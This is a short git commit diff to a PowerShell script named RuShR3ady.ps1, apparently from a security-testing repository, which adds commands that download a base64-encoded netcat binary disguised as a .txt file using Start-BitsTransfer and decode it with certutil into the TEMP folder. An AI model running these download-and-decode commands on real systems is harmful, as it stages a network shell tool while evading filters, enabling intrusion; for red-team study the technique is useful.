5197bcc663021c1f83f36f9c949c0edb14c5f667
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-05-09 22:33:28 +0100

    Update RuShR3ady.ps1

--- RuShR3ady.ps1
+++ RuShR3ady.ps1
@@ -1,2 +1,8 @@
 #example
 powershell calc.exe
+
+#echo "Securethelogs.com" >> "C:\temp\important_document.txt"
+#Start-Process powershell.exe "C:\temp\important_document.txt"
+
+Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
+certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
